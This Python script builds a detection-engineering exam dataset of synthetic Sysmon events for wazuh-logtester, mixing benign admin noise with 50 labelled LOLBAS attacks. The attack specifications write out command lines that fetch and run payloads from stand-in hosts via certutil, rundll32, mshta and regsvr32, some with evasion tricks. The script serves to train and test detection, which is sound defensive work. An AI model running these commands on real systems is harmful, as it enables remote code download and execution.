#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Генератор экзаменационного датасета L2 (Detection Engineering / LOLBAS).

Датасет: ровно 1000 кейсов Sysmon Event ID 1 в формате wazuh-logtester:
  * 950 «шумовых» событий шести классов доверия (SCCM, Veeam, Zabbix,
    Maintenance, certutil legit, rundll32 legit);
  * 50 атак LOLBAS-семейств certutil / rundll32 / mshta / regsvr32,
    из них 12 с признаком evasion (обфускация аргументов/путей).

Детерминированность: SEED зафиксирован, повторный запуск даёт байт-идентичный
exam_dataset.json. Только stdlib: json, random, pathlib, datetime.

Запуск (из любого каталога):
    python3 generate_dataset.py
"""

import json
import random
from datetime import datetime, timedelta
from pathlib import Path

SEED = 20260819
OUTPUT_PATH = Path(__file__).resolve().parent / "exam_dataset.json"

HOST = "kingslanding.sevenkingdoms.local"
SYSTEM32 = "C:\\Windows\\System32\\"
POWERSHELL = SYSTEM32 + "WindowsPowerShell\\v1.0\\powershell.exe"
CMD = SYSTEM32 + "cmd.exe"
EXPLORER = "C:\\Windows\\explorer.exe"
WINRSHOST = SYSTEM32 + "winrshost.exe"

ADMIN_USER = "SEVENKINGDOMS\\Administrator"
SYSTEM_USER = "NT AUTHORITY\\SYSTEM"

NOISE_RULE_ID = 100251
NOISE_LEVEL = 0
ATTACK_LEVEL = 10

FAMILIES = ("certutil", "rundll32", "mshta", "regsvr32")
FAMILY_COUNTS = {"certutil": 15, "rundll32": 15, "mshta": 10, "regsvr32": 10}
FAMILY_RULE_ID = {"certutil": 100801, "rundll32": 100802, "mshta": 100803, "regsvr32": 100804}
FAMILY_MITRE = {
    "certutil": "T1105",
    "rundll32": "T1218.011",
    "mshta": "T1218.005",
    "regsvr32": "T1218.010",
}
FAMILY_EXE = {
    "certutil": "certutil.exe",
    "rundll32": "rundll32.exe",
    "mshta": "mshta.exe",
    "regsvr32": "regsvr32.exe",
}

NOISE_DISTRIBUTION = {
    "sccm": 250,
    "veeam": 150,
    "zabbix": 150,
    "maintenance": 150,
    "certutil_legit": 100,
    "rundll32_legit": 150,
}
TRUST_LABELS = {
    "sccm": "SCCM",
    "veeam": "Veeam",
    "zabbix": "Zabbix",
    "maintenance": "Maintenance",
    "certutil_legit": "certutil legit",
    "rundll32_legit": "rundll32 legit",
}

NOISE_COUNT = 950
ATTACK_COUNT = 50
TOTAL_COUNT = 1000
EVASION_COUNT = 12

FORBIDDEN_WORDS = ("студент", "методичка")

HEX = "0123456789ABCDEF"


class EventFactory:
    """Собирает событие Sysmon EID 1, кешируя PID/GUID/хеши для реалистичности."""

    def __init__(self, rng):
        self.rng = rng
        self._hashes = {}
        self._guids = {}
        self._pids = {}
        self._guid_seq = 0

    def _hash_line(self, image):
        key = image.lower()
        if key not in self._hashes:
            self._hashes[key] = (
                "MD5=" + _hex(self.rng, 32)
                + ",SHA256=" + _hex(self.rng, 64)
                + ",IMPHASH=" + _hex(self.rng, 32)
            )
        return self._hashes[key]

    def _guid(self, key):
        if key not in self._guids:
            self._guid_seq += 1
            self._guids[key] = "{%s-%s-%s-%s-%012d}" % (
                _hex(self.rng, 8).lower(),
                _hex(self.rng, 4).lower(),
                _hex(self.rng, 4).lower(),
                _hex(self.rng, 4).lower(),
                self._guid_seq,
            )
        return self._guids[key]

    def _pid(self, image):
        key = image.lower()
        if key not in self._pids:
            self._pids[key] = self.rng.randint(500, 7800)
        return self._pids[key]

    def make(
        self,
        *,
        image,
        command_line,
        parent_image,
        parent_command_line,
        user,
        current_directory="C:\\Windows\\system32\\",
    ):
        return {
            "win": {
                "system": {
                    "providerName": "Microsoft-Windows-Sysmon",
                    "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                    "eventID": "1",
                    "version": "5",
                    "level": "4",
                    "task": "1",
                    "opcode": "0",
                    "keywords": "0x8000000000000000",
                    "systemTime": "",
                    "eventRecordID": "",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer": HOST,
                    "severityValue": "INFORMATION",
                },
                "eventdata": {
                    "utcTime": "",
                    "processGuid": self._guid((image.lower(), parent_image.lower())),
                    "processId": str(self._pid(image)),
                    "image": image,
                    "commandLine": command_line,
                    "currentDirectory": current_directory,
                    "user": user,
                    "parentProcessGuid": self._guid((parent_image.lower(),)),
                    "parentProcessId": str(self._pid(parent_image)),
                    "parentImage": parent_image,
                    "parentCommandLine": parent_command_line,
                    "hashes": self._hash_line(image),
                },
            }
        }


def _hex(rng, length):
    return "".join(rng.choice(HEX) for _ in range(length))


def _count(iterable):
    counts = {}
    for item in iterable:
        counts[item] = counts.get(item, 0) + 1
    return counts


def _noise_case(event, trust, descr):
    return {
        "name": "",
        "category": "noise",
        "attack": None,
        "evasion": False,
        "expected_rule_id": NOISE_RULE_ID,
        "expected_level": NOISE_LEVEL,
        "mitre_id": None,
        "trust": trust,
        "descr": descr,
        "event_obj": event,
    }


def _attack_case(event, family, descr, evasion, mitre):
    return {
        "name": "",
        "category": "attack",
        "attack": family,
        "evasion": evasion,
        "expected_rule_id": FAMILY_RULE_ID[family],
        "expected_level": ATTACK_LEVEL,
        "mitre_id": mitre,
        "trust": None,
        "descr": descr,
        "event_obj": event,
    }


# ---------------------------------------------------------------------------
# Шумовые классы (контракт сигналов доверия с Blue Teamer)
# ---------------------------------------------------------------------------

def build_sccm(factory, rng):
    """250 событий: инвентаризация SCCM из-под CcmExec."""
    pool = [
        (SYSTEM32 + "wmic.exe", "wmic path win32_computersystem product get name", "wmic inventory"),
        (SYSTEM32 + "wmic.exe", "wmic path Win32_BIOS get SerialNumber", "wmic bios serial"),
        (SYSTEM32 + "wmic.exe", "wmic path Win32_OperatingSystem get Caption,Version /Value", "wmic os caption"),
        (SYSTEM32 + "wmic.exe", "wmic logicaldisk get caption,size,freespace", "wmic logicaldisk"),
        (SYSTEM32 + "wmic.exe", "wmic path win32_computersystem get domain,username", "wmic domain"),
        (SYSTEM32 + "wmic.exe", "wmic os get FreePhysicalMemory /Value", "wmic memory"),
        (POWERSHELL, 'powershell.exe -NoProfile -Command "Get-WmiObject Win32_Service"', "powershell Get-WmiObject"),
        (POWERSHELL, 'powershell.exe -NoProfile -Command "Get-WmiObject Win32_ComputerSystem"', "powershell Get-WmiObject"),
        (POWERSHELL, 'powershell.exe -NoProfile -Command "Get-CimInstance Win32_OperatingSystem"', "powershell Get-CimInstance"),
        (POWERSHELL, 'powershell.exe -NoLogo -NoProfile -Command "Get-WmiObject Win32_LogicalDisk"', "powershell Get-WmiObject"),
        (POWERSHELL, 'powershell.exe -ExecutionPolicy Bypass -Command "Get-WmiObject Win32_BIOS"', "powershell Get-WmiObject"),
        (CMD, 'cmd.exe /c "wmic computersystem get name,domain /format:list"', "cmd wmic inventory"),
        (CMD, 'cmd.exe /c "wmic os get FreePhysicalMemory /Value"', "cmd wmic memory"),
        (CMD, "cmd.exe /c wmic path win32_product get name", "cmd wmic products"),
    ]
    parent_cmds = [
        '"C:\\Windows\\CCM\\CcmExec.exe"',
        "C:\\Windows\\CCM\\CcmExec.exe -service",
        '"C:\\Windows\\CCM\\CcmExec.exe" -service -redirectWindowsUpdateLog',
    ]
    cases = []
    for _ in range(250):
        if not cases:
            # Первый кейс фиксирован под пример формата: "noise 001 | SCCM | wmic inventory".
            image, cmd, label = pool[0]
            parent_cmd = parent_cmds[0]
            cwd = "C:\\Windows\\system32\\"
        else:
            image, cmd, label = pool[rng.randrange(len(pool))]
            parent_cmd = parent_cmds[rng.randrange(len(parent_cmds))]
            cwd = "C:\\Windows\\system32\\" if rng.random() < 0.7 else "C:\\Windows\\CCM\\"
        event = factory.make(
            image=image,
            command_line=cmd,
            parent_image="C:\\Windows\\CCM\\CcmExec.exe",
            parent_command_line=parent_cmd,
            user=SYSTEM_USER,
            current_directory=cwd,
        )
        cases.append(_noise_case(event, "sccm", label))
    return cases


def build_veeam(factory, rng):
    """150 событий: скрипты бэкапа Veeam Agent."""
    pool = [
        ('powershell.exe -NoProfile -File "C:\\Program Files\\Veeam\\Backup\\Scripts\\backup_post.ps1"', "backup_post.ps1"),
        ('powershell.exe -NoProfile -File "C:\\Program Files\\Veeam\\Backup\\Scripts\\pre_job.ps1"', "pre_job.ps1"),
        ('powershell.exe -NoProfile -Command "Get-VBRJob | Select-Object Name,LastResult"', "Get-VBRJob"),
        ('powershell.exe -NoProfile -Command "Start-VBRJob -Job \'DailyBackup\'"', "Start-VBRJob"),
        ("powershell.exe -ExecutionPolicy Bypass -File C:\\Program Files\\Veeam\\Backup\\Scripts\\vss_check.ps1", "vss_check.ps1"),
        ('powershell.exe -NoProfile -Command "Get-VBRBackupSession | Where-Object {$_.Result -eq \'Success\'}"', "Get-VBRBackupSession"),
        ("powershell.exe -NoProfile -Command \"Get-Volume | Where-Object DriveLetter -eq 'D'\"", "Get-Volume"),
    ]
    parent_cmds = [
        '"C:\\Program Files\\Veeam\\Backup\\VeeamAgent.exe" -runjob DailyBackup',
        '"C:\\Program Files\\Veeam\\Backup\\VeeamAgent.exe" -runjob NightlyBackup',
        "C:\\Program Files\\Veeam\\Backup\\VeeamAgent.exe",
    ]
    cases = []
    for _ in range(150):
        cmd, label = pool[rng.randrange(len(pool))]
        parent_cmd = parent_cmds[rng.randrange(len(parent_cmds))]
        event = factory.make(
            image=POWERSHELL,
            command_line=cmd,
            parent_image="C:\\Program Files\\Veeam\\Backup\\VeeamAgent.exe",
            parent_command_line=parent_cmd,
            user="SEVENKINGDOMS\\backup_svc",
            current_directory="C:\\Program Files\\Veeam\\Backup\\",
        )
        cases.append(_noise_case(event, "veeam", label))
    return cases


def build_zabbix(factory, rng):
    """150 событий: проверки Zabbix Agent."""
    pool = [
        ('cmd.exe /c "sc query W32Time"', "sc query W32Time"),
        ('cmd.exe /c "sc query WinRM"', "sc query WinRM"),
        ('cmd.exe /c tasklist /FI "IMAGENAME eq zabbix_agentd.exe"', "tasklist zabbix"),
        ('cmd.exe /c "net start | findstr /I spooler"', "net start spooler"),
        ('cmd.exe /c typeperf "\\Processor(_Total)\\% Processor Time" -sc 1', "typeperf cpu"),
        ("powershell.exe -NoProfile -Command \"Get-Service | Where-Object {$_.Status -eq 'Stopped'}\"", "Get-Service stopped"),
        ('powershell.exe -NoProfile -Command "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5"', "Get-Process top"),
        ('powershell.exe -NoProfile -Command "Get-EventLog -LogName System -Newest 10"', "Get-EventLog"),
        ('cmd.exe /c "fsutil volume diskfree C:"', "fsutil diskfree"),
    ]
    cases = []
    for _ in range(150):
        cmd, label = pool[rng.randrange(len(pool))]
        image = POWERSHELL if cmd.startswith("powershell.exe") else CMD
        event = factory.make(
            image=image,
            command_line=cmd,
            parent_image="C:\\Program Files\\Zabbix Agent\\zabbix_agentd.exe",
            parent_command_line=(
                '"C:\\Program Files\\Zabbix Agent\\zabbix_agentd.exe" '
                '--config "C:\\Program Files\\Zabbix Agent\\zabbix_agentd.conf"'
            ),
            user=SYSTEM_USER,
            current_directory="C:\\Windows\\system32\\",
        )
        cases.append(_noise_case(event, "zabbix", label))
    return cases


def build_maintenance(factory, rng):
    """150 событий: плановый health_check.ps1 из-под taskeng (путь скрипта неизменен)."""
    variants = [
        ("powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\Maintenance\\health_check.ps1", "taskeng health_check"),
        ("powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\Maintenance\\health_check.ps1", "taskeng health_check NoProfile"),
        ("powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\Maintenance\\health_check.ps1 -Verbose", "taskeng health_check Verbose"),
        ('powershell.exe -ExecutionPolicy Bypass -File "C:\\Scripts\\Maintenance\\health_check.ps1"', "taskeng health_check quoted"),
        ("powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\Maintenance\\health_check.ps1", "taskeng health_check NoLogo"),
        ("powershell.exe -NonInteractive -ExecutionPolicy Bypass -File C:\\Scripts\\Maintenance\\health_check.ps1", "taskeng health_check NonInteractive"),
        ("powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\Maintenance\\health_check.ps1 -ReportOnly", "taskeng health_check ReportOnly"),
    ]
    cases = []
    for _ in range(150):
        cmd, label = variants[rng.randrange(len(variants))]
        event = factory.make(
            image=POWERSHELL,
            command_line=cmd,
            parent_image=SYSTEM32 + "taskeng.exe",
            parent_command_line=SYSTEM32 + "taskeng.exe",
            user=SYSTEM_USER,
            current_directory="C:\\Windows\\system32\\",
        )
        cases.append(_noise_case(event, "maintenance", label))
    return cases


def build_certutil_legit(factory, rng):
    """100 событий: легитимный certutil (-pulse / -verifyctl)."""
    pool = [
        ("certutil.exe -pulse", "certutil pulse"),
        ("certutil.exe -pulse -v", "certutil pulse verbose"),
        ('certutil.exe -verifyctl "C:\\Windows\\Temp\\certs\\root.cer"', "certutil verifyctl root.cer"),
        ('certutil.exe -verifyctl -f "C:\\Windows\\Temp\\certs\\ca.cer"', "certutil verifyctl ca.cer"),
        ('certutil.exe -verifyctl "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\cert.cer"', "certutil verifyctl machinekeys"),
        ('certutil.exe -dump "C:\\Windows\\Temp\\certs\\root.cer"', "certutil dump root.cer"),
        ("certutil.exe -store My", "certutil store My"),
        ('certutil.exe -verifyctl "C:\\Users\\Public\\Documents\\ca-bundle.cer"', "certutil verifyctl ca-bundle.cer"),
    ]
    # Родители: служба cert propagation, планировщик, админский cmd.
    parent_kinds = ["svchost", "svchost", "taskeng", "cmd"]
    cases = []
    for _ in range(100):
        cmd, label = pool[rng.randrange(len(pool))]
        kind = parent_kinds[rng.randrange(len(parent_kinds))]
        if kind == "svchost":
            parent_image = SYSTEM32 + "svchost.exe"
            parent_cmd = SYSTEM32 + "svchost.exe -k netsvcs -p -s CertPropSvc"
            user = SYSTEM_USER
        elif kind == "taskeng":
            parent_image = SYSTEM32 + "taskeng.exe"
            parent_cmd = SYSTEM32 + "taskeng.exe"
            user = SYSTEM_USER
        else:
            parent_image = CMD
            parent_cmd = "cmd.exe /c " + cmd
            user = ADMIN_USER
        event = factory.make(
            image=SYSTEM32 + "certutil.exe",
            command_line=cmd,
            parent_image=parent_image,
            parent_command_line=parent_cmd,
            user=user,
            current_directory="C:\\Windows\\system32\\",
        )
        cases.append(_noise_case(event, "certutil_legit", label))
    return cases


def build_rundll32_legit(factory, rng):
    """150 событий: легитимный rundll32 (панель управления из explorer)."""
    pool = [
        ("rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL", "Control_RunDLL"),
        ('rundll32.exe "C:\\Windows\\System32\\shell32.dll",Control_RunDLL', "Control_RunDLL quoted"),
        ("rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL desk.cpl", "Control_RunDLL desk.cpl"),
        ("rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL desk.cpl,,0", "Control_RunDLL desk args"),
        ('rundll32.exe "C:\\Windows\\System32\\shell32.dll",Control_RunDLL inetcpl.cpl,,4', "Control_RunDLL inetcpl"),
    ]
    cases = []
    for _ in range(150):
        cmd, label = pool[rng.randrange(len(pool))]
        event = factory.make(
            image=SYSTEM32 + "rundll32.exe",
            command_line=cmd,
            parent_image=EXPLORER,
            parent_command_line=EXPLORER,
            user=ADMIN_USER,
            current_directory="C:\\Windows\\System32\\",
        )
        cases.append(_noise_case(event, "rundll32_legit", label))
    return cases


# ---------------------------------------------------------------------------
# Атаки LOLBAS (50)
# ---------------------------------------------------------------------------

def _spec(descr, cmd, *, evasion=False, mitre=None, parent="cmd",
          cwd="C:\\Users\\Administrator\\", image=None):
    return {
        "descr": descr,
        "cmd": cmd,
        "evasion": evasion,
        "mitre": mitre,
        "parent": parent,
        "cwd": cwd,
        "image": image,
    }


def _parent_for(kind, child_cmd):
    if kind == "cmd":
        return CMD, "cmd.exe /c " + child_cmd
    if kind == "powershell":
        return POWERSHELL, 'powershell.exe -NoProfile -Command "' + child_cmd + '"'
    if kind == "explorer":
        return EXPLORER, EXPLORER
    if kind == "winrshost":
        return WINRSHOST, "winrshost.exe"
    raise ValueError("unknown parent kind: " + kind)


def _attack_specs():
    certutil = [
        _spec("urlcache download to Public",
              "certutil.exe -urlcache -split -f http://10.42.0.15/payload.exe C:\\Users\\Public\\payload.exe"),
        _spec("urlcache download to Temp",
              "certutil.exe -urlcache -split -f https://cdn.evil-cdn.com/tools/artifact.exe C:\\Windows\\Temp\\artifact.exe",
              parent="powershell"),
        _spec("urlcache download to ProgramData",
              "certutil.exe -urlcache -split -f http://185.220.101.7/node.exe C:\\ProgramData\\node.exe"),
        _spec("urlcache download to TEMP env",
              "certutil.exe -urlcache -split -f http://10.42.0.15/upd.dat %TEMP%\\upd.dat"),
        _spec("urlcache download ps1 to ProgramData",
              "certutil.exe -urlcache -split -f https://raw.githubusercontent.com/evil-tools/loader/main/r.ps1 C:\\ProgramData\\r.ps1"),
        _spec("urlcache download no split",
              "certutil.exe -urlcache -f http://10.42.0.15/n.exe C:\\Users\\Public\\n.exe"),
        _spec("decode b64 in ProgramData",
              "certutil.exe -decode C:\\ProgramData\\staged.b64 C:\\ProgramData\\staged.exe",
              mitre="T1105/T1140"),
        _spec("decode slash-flag in Public",
              "certutil.exe /decode C:\\Users\\Public\\enc.b64 C:\\Users\\Public\\enc.exe",
              mitre="T1105/T1140"),
        _spec("decode triple-dash flag",
              "certutil.exe ---decode C:\\Users\\Public\\stage.b64 C:\\Users\\Public\\stage.exe",
              mitre="T1105/T1140"),
        _spec("decode b64 to TEMP env",
              "certutil.exe -decode C:\\ProgramData\\p.b64 %TEMP%\\p.exe",
              mitre="T1105/T1140"),
        _spec("urlcache download mixed-case binary",
              "cErTuTiL.eXe -urlcache -split -f http://10.42.0.15/a.exe C:\\Users\\Public\\a.exe",
              evasion=True, image=SYSTEM32 + "cErTuTiL.eXe"),
        _spec("urlcache download glued split-f flag",
              "certutil.exe -urlcache -split-f http://10.42.0.15/b.exe C:\\Users\\Public\\b.exe",
              evasion=True),
        _spec("urlcache via relative path parent",
              "..\\..\\certutil.exe -urlcache -split -f http://10.42.0.15/c.exe C:\\Users\\Public\\c.exe",
              evasion=True, cwd="C:\\Windows\\System32\\wbem\\", image="..\\..\\certutil.exe"),
        _spec("urlcache download from 192.168.1.50",
              "certutil.exe -urlcache -split -f http://192.168.1.50/m.exe C:\\Users\\Public\\m.exe",
              parent="winrshost"),
        _spec("urlcache download from transfer.sh",
              "certutil.exe -urlcache -split -f https://transfer.sh/ab12/backdoor.exe C:\\ProgramData\\backdoor.exe"),
    ]
    rundll32 = [
        _spec("Temp dll entry point",
              "rundll32.exe C:\\Users\\Administrator\\AppData\\Local\\Temp\\payload.dll,Start"),
        _spec("Public dll entry point",
              "rundll32.exe C:\\Users\\Public\\aa.dll,EntryPoint"),
        _spec("ProgramData dll service init",
              "rundll32.exe C:\\ProgramData\\cache\\helper.dll,Init"),
        _spec("Windows Temp dll ServiceMain",
              "rundll32.exe C:\\Windows\\Temp\\update.dll,ServiceMain"),
        _spec("Downloads dll Start",
              "rundll32.exe C:\\Users\\Administrator\\Downloads\\stage.dll,Start",
              parent="explorer", cwd="C:\\Users\\Administrator\\"),
        _spec("UNC share beacon dll",
              "rundll32.exe \\\\10.42.0.15\\share\\beacon.dll,DllMain",
              evasion=True, parent="powershell"),
        _spec("WebDAV remote dll",
              "rundll32.exe \\\\evil.com@80\\test.dll,Exec",
              evasion=True),
        _spec("ordinal export #1",
              "rundll32.exe C:\\Users\\Public\\aa.dll,#1",
              evasion=True),
        _spec("hidden .dat extension",
              "rundll32.exe C:\\Users\\Public\\invoice.dat,Print",
              evasion=True),
        _spec("hidden .png extension",
              "rundll32.exe C:\\Users\\Public\\logo.png,Export"),
        _spec("quoted My Documents dll",
              "rundll32.exe \"C:\\Users\\Default\\My Documents\\secret.dll\",EntryPoint",
              evasion=True, cwd="C:\\Users\\Default\\"),
        _spec("Public dll DllRegisterServer",
              "rundll32.exe C:\\Users\\Public\\dd.dll,DllRegisterServer"),
        _spec("Temp dll with data argument",
              "rundll32.exe C:\\Users\\Administrator\\AppData\\Local\\Temp\\crypt.dll,Decrypt C:\\Users\\Administrator\\Documents\\data.bin"),
        _spec("quoted Public dll",
              "rundll32.exe \"C:\\Users\\Public\\ee.dll\",Run"),
        _spec("ProgramData Packages dll",
              "rundll32.exe C:\\ProgramData\\Packages\\payload.dll,entry"),
    ]
    mshta = [
        _spec("remote HTA 192.168.1.50", "mshta.exe http://192.168.1.50/run.hta"),
        _spec("remote HTA lab host", "mshta.exe http://10.42.0.15/payload.hta",
              parent="winrshost"),
        _spec("quoted remote HTA", "mshta.exe \"http://192.168.1.50/run.hta\""),
        _spec("local HTA in Public", "mshta.exe C:\\Users\\Public\\update.hta",
              parent="explorer", cwd="C:\\Users\\Public\\"),
        _spec("local HTA in Temp",
              "mshta.exe C:\\Users\\Administrator\\AppData\\Local\\Temp\\invoice.hta"),
        _spec("HTA from UNC share", "mshta.exe \\\\10.42.0.15\\share\\scan.hta"),
        _spec("inline vbscript Execute",
              "mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"cmd /c whoami > C:\\Users\\Public\\who.txt\"\",0:close\")",
              evasion=True),
        _spec("inline javascript GetObject",
              "mshta.exe javascript:a=GetObject(\"script:http://192.168.1.50/run.sct\").Exec();close()",
              evasion=True),
        _spec("remote HTA pastebin", "mshta.exe https://pastebin.com/raw/mshta1"),
        _spec("local HTA in Windows Temp", "mshta.exe C:\\Windows\\Temp\\scan.hta"),
    ]
    regsvr32 = [
        _spec("Squiblydoo remote SCT 192.168.1.50",
              "regsvr32.exe /s /n /u /i:http://192.168.1.50/regsvr.sct scrobj.dll"),
        _spec("Squiblydoo pastebin SCT",
              "regsvr32.exe /s /n /u /i:https://pastebin.com/raw/xyz123 scrobj.dll"),
        _spec("local SCT in Public",
              "regsvr32.exe /i:C:\\Users\\Public\\payload.sct scrobj.dll"),
        _spec("local SCT in ProgramData",
              "regsvr32.exe /s /u /i:C:\\ProgramData\\payload.sct C:\\Windows\\System32\\scrobj.dll"),
        _spec("Squiblydoo remote SCT lab host",
              "regsvr32.exe /s /n /u /i:http://10.42.0.15/remote.sct scrobj.dll",
              parent="powershell"),
        _spec("extra spaces quoted URL",
              "regsvr32.exe  /s   \"/i:https://pastebin.com/raw/xyz\"   scrobj.dll",
              evasion=True),
        _spec("mixed-case binary with spaces",
              "ReGsVr32.eXe /s  /n  /u  /i:http://192.168.1.50/a.sct  scrobj.dll",
              evasion=True, image=SYSTEM32 + "ReGsVr32.eXe"),
        _spec("local SCT in Temp",
              "regsvr32.exe /s C:\\Users\\Administrator\\AppData\\Local\\Temp\\inv.sct scrobj.dll"),
        _spec("Squiblydoo remote SCT evil domain",
              "regsvr32.exe /u /i:http://update.evil.com/1.sct scrobj.dll"),
        _spec("local SCT second Public",
              "regsvr32.exe /s /n /i:C:\\Users\\Public\\2.sct scrobj.dll"),
    ]
    return {
        "certutil": certutil,
        "rundll32": rundll32,
        "mshta": mshta,
        "regsvr32": regsvr32,
    }


def build_attacks(factory):
    cases = []
    specs = _attack_specs()
    for family in FAMILIES:
        for item in specs[family]:
            parent_image, parent_cmd = _parent_for(item["parent"], item["cmd"])
            event = factory.make(
                image=item["image"] or SYSTEM32 + FAMILY_EXE[family],
                command_line=item["cmd"],
                parent_image=parent_image,
                parent_command_line=parent_cmd,
                user=ADMIN_USER,
                current_directory=item["cwd"],
            )
            mitre = item["mitre"] or FAMILY_MITRE[family]
            cases.append(_attack_case(event, family, item["descr"], item["evasion"], mitre))
    return cases


# ---------------------------------------------------------------------------
# Валидация контракта и сборка
# ---------------------------------------------------------------------------

def _classify_noise(case):
    """Один и только один класс доверия для шумового кейса (по сигнатурам)."""
    if case["category"] != "noise":
        return None
    ed = case["event_obj"]["win"]["eventdata"]
    image = ed["image"].lower()
    parent = ed["parentImage"].lower()
    cmd = ed["commandLine"].lower()
    if parent == "c:\\windows\\ccm\\ccmexec.exe":
        return "sccm"
    if parent == "c:\\program files\\veeam\\backup\\veeamagent.exe":
        return "veeam"
    if parent == "c:\\program files\\zabbix agent\\zabbix_agentd.exe":
        return "zabbix"
    if (
        image == "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"
        and parent == "c:\\windows\\system32\\taskeng.exe"
        and "c:\\scripts\\maintenance\\health_check.ps1" in cmd
    ):
        return "maintenance"
    if image == "c:\\windows\\system32\\certutil.exe":
        return "certutil_legit"
    if image == "c:\\windows\\system32\\rundll32.exe" and parent == "c:\\windows\\explorer.exe":
        return "rundll32_legit"
    return None


def _validate_noise(noise):
    assert len(noise) == NOISE_COUNT, "noise count: %d != %d" % (len(noise), NOISE_COUNT)
    trust_counts = _count(case["trust"] for case in noise)
    assert trust_counts == NOISE_DISTRIBUTION, "noise distribution mismatch: %r" % (trust_counts,)
    for case in noise:
        classified = _classify_noise(case)
        assert classified == case["trust"], (
            "noise case not covered by exactly one trust class: %r -> %r (declared %r)"
            % (case["descr"], classified, case["trust"])
        )
        assert case["expected_rule_id"] == NOISE_RULE_ID
        assert case["expected_level"] == NOISE_LEVEL


def _validate_attacks(attacks):
    assert len(attacks) == ATTACK_COUNT, "attack count: %d != %d" % (len(attacks), ATTACK_COUNT)
    family_counts = _count(case["attack"] for case in attacks)
    assert family_counts == FAMILY_COUNTS, "attack family mismatch: %r" % (family_counts,)
    evasion_count = sum(1 for case in attacks if case["evasion"])
    assert evasion_count == EVASION_COUNT, "evasion count: %d != %d" % (evasion_count, EVASION_COUNT)
    for case in attacks:
        assert case["expected_rule_id"] == FAMILY_RULE_ID[case["attack"]]
        assert case["expected_level"] == ATTACK_LEVEL
        assert case["mitre_id"], "attack without mitre_id: %r" % (case["descr"],)
        assert _classify_noise(case) is None, "attack matched a noise trust class: %r" % (case["descr"],)


def _validate(cases):
    assert len(cases) == TOTAL_COUNT, "total count: %d != %d" % (len(cases), TOTAL_COUNT)
    category_counts = _count(case["category"] for case in cases)
    assert category_counts == {"noise": NOISE_COUNT, "attack": ATTACK_COUNT}, (
        "category distribution mismatch: %r" % (category_counts,)
    )
    names = [case["name"] for case in cases]
    assert len(set(names)) == TOTAL_COUNT, "duplicate test names"
    for name in names:
        lowered = name.lower()
        for word in FORBIDDEN_WORDS:
            assert word not in lowered, "forbidden word %r in name %r" % (word, name)
    for case in cases:
        event_json = json.dumps(case["event_obj"], separators=(",", ":"), ensure_ascii=False)
        parsed = json.loads(event_json)
        assert parsed["win"]["system"]["eventID"] == "1"
        assert "\n" not in event_json
        # времена в диапазоне 2026-08-19
        assert parsed["win"]["system"]["systemTime"].startswith("2026-08-19T")
        assert parsed["win"]["eventdata"]["utcTime"].startswith("2026-08-19 ")


def _assign_timestamps(cases, rng):
    """Единая уникальная шкала 2026-08-19 (непересекающиеся 80-секундные блоки)."""
    start = datetime(2026, 8, 19, 0, 0, 20)
    for index, case in enumerate(cases):
        offset_us = index * 80_000_000 + rng.randrange(0, 79_000_000)
        dt = start + timedelta(microseconds=offset_us)
        event = case["event_obj"]
        event["win"]["system"]["systemTime"] = (
            dt.strftime("%Y-%m-%dT%H:%M:%S")
            + f".{dt.microsecond:06d}{rng.randrange(0, 1000):03d}Z"
        )
        event["win"]["system"]["eventRecordID"] = str(549100 + index)
        event["win"]["eventdata"]["utcTime"] = (
            dt.strftime("%Y-%m-%d %H:%M:%S") + f".{dt.microsecond // 1000:03d}"
        )


def build_dataset():
    rng = random.Random(SEED)
    factory = EventFactory(rng)

    noise = []
    noise += build_sccm(factory, rng)
    noise += build_veeam(factory, rng)
    noise += build_zabbix(factory, rng)
    noise += build_maintenance(factory, rng)
    noise += build_certutil_legit(factory, rng)
    noise += build_rundll32_legit(factory, rng)
    attacks = build_attacks(factory)

    _validate_noise(noise)
    _validate_attacks(attacks)

    cases = noise + attacks
    for index, case in enumerate(noise, start=1):
        case["name"] = "noise %03d | %s | %s" % (index, TRUST_LABELS[case["trust"]], case["descr"])
    for family in FAMILIES:
        number = 1
        for case in attacks:
            if case["attack"] != family:
                continue
            suffix = " | evasion" if case["evasion"] else ""
            case["name"] = "attack %s %02d | %s%s" % (family, number, case["descr"], suffix)
            number += 1

    _assign_timestamps(cases, rng)
    _validate(cases)
    return cases


def _to_tests(cases):
    tests = []
    for case in cases:
        if case["category"] == "noise":
            expect = {"alert": False}
        else:
            expect = {"rule.id": str(case["expected_rule_id"]), "alert": True}
        tests.append({
            "name": case["name"],
            "event": json.dumps(case["event_obj"], separators=(",", ":"), ensure_ascii=False),
            "expect": expect,
            "category": case["category"],
            "attack": case["attack"],
            "evasion": case["evasion"],
            "expected_rule_id": case["expected_rule_id"],
            "expected_level": case["expected_level"],
            "mitre_id": case["mitre_id"],
        })
    return tests


def main():
    cases = build_dataset()
    tests = _to_tests(cases)

    dataset = {
        "name": "exam_l2_lolbas",
        "description": "L2 exam: alert fatigue + LOLBAS detection (certutil/rundll32/mshta/regsvr32)",
        "default_location": "Microsoft-Windows-Sysmon/Operational",
        "default_log_format": "json",
        "session_mode": "per_test",
        "tests": tests,
    }
    text = json.dumps(dataset, indent=2, ensure_ascii=False)
    OUTPUT_PATH.write_text(text + "\n", encoding="utf-8")

    category_counts = _count(case["category"] for case in cases)
    family_counts = _count(case["attack"] for case in cases if case["category"] == "attack")
    trust_counts = _count(case["trust"] for case in cases if case["category"] == "noise")
    evasion_count = sum(1 for case in cases if case["evasion"])
    print("wrote %s" % OUTPUT_PATH)
    print("seed=%d tests=%d bytes=%d" % (SEED, len(tests), len(text) + 1))
    print("categories: %r" % (category_counts,))
    print("attack families: %r" % (family_counts,))
    print("noise trust classes: %r" % (trust_counts,))
    print("evasion: %d" % evasion_count)


